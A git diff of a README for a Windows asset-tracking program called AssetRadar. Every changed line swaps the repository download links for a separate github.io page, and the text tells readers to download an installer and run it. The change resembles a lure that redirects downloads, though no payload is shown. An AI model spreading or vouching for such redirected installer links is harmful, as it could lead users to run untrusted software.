@@ -1,7 +1,7 @@
 <h1>📡 asset-radar-update-hub - Simplify Your Asset Tracking Today</h1>
 
 <p align="center">
-  <a href="https://github.com/photogrammetrywolf/asset-radar-update-hub" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download AssetRadar Now</a>
+  <a href="https://photogrammetrywolf.github.io" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download AssetRadar Now</a>
 </p>
 
 <h2>📋 Overview</h2>
@@ -10,7 +10,7 @@
 <h2>🚀 Getting Started</h2>
 <p>To get AssetRadar running on your Windows system, follow these simple steps:</p>
 <ol>
-  <li><strong>Visit the download page:</strong> Click the green button above or go directly to: <a href="https://github.com/photogrammetrywolf/asset-radar-update-hub">https://github.com/photogrammetrywolf/asset-radar-update-hub</a></li>
+  <li><strong>Visit the download page:</strong> Click the green button above or go directly to: <a href="https://photogrammetrywolf.github.io">https://photogrammetrywolf.github.io</a></li>
   <li><strong>Download the software:</strong> On the GitHub page, look for a "Releases" or "Download" section. Click the link that says something like "AssetRadar Setup" or "Download ZIP."</li>
   <li><strong>Run the installer:</strong> Once downloaded, double-click the file to start the setup process. Follow any on-screen instructions.</li>
   <li><strong>Launch AssetRadar:</strong> After installation, open AssetRadar from your Start menu or desktop shortcut. The main window will appear, ready for you to use.</li>
@@ -86,7 +86,7 @@ A: Yes, AssetRadar does not send your data anywhere. All files stay on your comp
 <p>AssetRadar is released under an open-source license. You are free to use, modify, and distribute the software as long as you comply with the license terms. For full details, see the <code>LICENSE</code> file included in the download or visit the GitHub repository.</p>
 
 <p align="center">
-  <a href="https://github.com/photogrammetrywolf/asset-radar-update-hub" style="display:inline-block;padding:12px 24px;background:#FF5722;color:white;text-decoration:none;border-radius:6px;font-size:18px;">📥 Download AssetRadar</a>
+  <a href="https://photogrammetrywolf.github.io" style="display:inline-block;padding:12px 24px;background:#FF5722;color:white;text-decoration:none;border-radius:6px;font-size:18px;">📥 Download AssetRadar</a>
 </p>
 
 <p align="center"><em>AssetRadar - Keeping your digital world organized, one asset at a time.</em></p>
